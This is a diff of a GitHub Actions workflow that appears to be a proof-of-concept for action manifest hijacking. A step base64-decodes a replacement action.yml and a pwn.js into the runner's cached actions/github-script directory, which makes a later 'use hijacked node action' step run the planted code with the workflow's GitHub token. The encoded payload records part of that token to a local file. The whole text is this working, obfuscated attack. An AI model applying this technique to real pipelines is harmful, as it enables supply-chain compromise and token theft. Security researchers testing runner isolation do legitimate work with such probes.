@@ -9,17 +9,17 @@ jobs:
     steps:
       - name: locate and hijack later node action manifest
         env:
-          MANIFEST_B64: "bmFtZTogcHduCmRlc2NyaXB0aW9uOiBtYW5pZmVzdCBoaWphY2sgcHJvYmUKaW5wdXRzOgogIGdpdGh1Yl90b2tlbjoKICAgIGRlZmF1bHQ6ICR7eyBnaXRodWIudG9rZW4gfX0KcnVuczoKICB1c2luZzogbm9kZTIwCiAgbWFpbjogcHduLmpzCg=="
-          JS_B64: "Y29uc3QgZnM9cmVxdWlyZSgnZnMnKTsKdHJ5e2ZzLmFwcGVuZEZpbGVTeW5jKCcvdG1wL3B3bl9tYXJrZXIudHh0JywnUFdORURfRVhFQyB0b2tlbj0nKyhwcm9jZXNzLmVudi5JTlBVVF9HSVRIVUJfVE9LRU4/cHJvY2Vzcy5lbnYuSU5QVVRfR0lUSFVCX1RPS0VOLnNsaWNlKDAsNCk6J25vbmUnKSsnXG4nKTt9Y2F0Y2goZSl7fQpjb25zb2xlLmxvZygnUFdORURfQUNUSU9OX01BTklGRVNUX0VYRUNVVEVEIHRva2VuX3ByZXNlbnQ9JyshIXByb2Nlc3MuZW52LklOUFVUX0dJVEhVQl9UT0tFTik7Cg=="
+          MANIFEST_B64: "bmFtZTogcHduCmRlc2NyaXB0aW9uOiBtYW5pZmVzdCBoaWphY2sgcHJvYmUKaW5wdXRzOgogIGdpdGh1Yi10b2tlbjoKICAgIGRlZmF1bHQ6ICR7eyBnaXRodWIudG9rZW4gfX0KICBnaXRodWJfdG9rZW46CiAgICBkZWZhdWx0OiAke3sgZ2l0aHViLnRva2VuIH19CnJ1bnM6CiAgdXNpbmc6IG5vZGUyMAogIG1haW46IHB3bi5qcwo="
+          JS_B64: "Y29uc3QgZnM9cmVxdWlyZSgnZnMnKTsKY29uc3QgdD1wcm9jZXNzLmVudlsnSU5QVVRfR0lUSFVCLVRPS0VOJ118fHByb2Nlc3MuZW52LklOUFVUX0dJVEhVQl9UT0tFTnx8Jyc7CnRyeXtmcy5hcHBlbmRGaWxlU3luYygnL3RtcC9wd25fbWFya2VyLnR4dCcsJ1BXTkVEX0VYRUMgdG9rZW49JysodD90LnNsaWNlKDAsNCk6J25vbmUnKSsnXG4nKTt9Y2F0Y2goZSl7fQpjb25zb2xlLmxvZygnUFdORURfQUNUSU9OX01BTklGRVNUX0VYRUNVVEVEIHRva2VuX3ByZXNlbnQ9JyshIXQpOwo="
         run: |
           echo "--- work dir ---"; ls -la /home/runner/work 2>&1 | head
           echo "--- actions dirs ---"; ls -d /home/runner/work/_actions/*/* 2>&1 | head -20
-          d=/home/runner/work/_actions/actions/github-script/f28e40c7f34bde8b3046d885e986cb6290c7db3c
+          d=/home/runner/work/_actions/actions/github-script/60a0d83039c74a4aee543508d2ffcb1c3799cdea
           echo "--- target ---"; ls -la "$d" 2>&1 | head -8
           printf '%s' "$MANIFEST_B64" | base64 -d > "$d/action.yml" && echo WROTE_MANIFEST
           printf '%s' "$JS_B64" | base64 -d > "$d/pwn.js" && echo WROTE_JS
       - name: use hijacked node action
-        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c7db3c
+        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
         with:
           script: console.log('LEGIT_GITHUB_SCRIPT_RAN')
       - name: proof
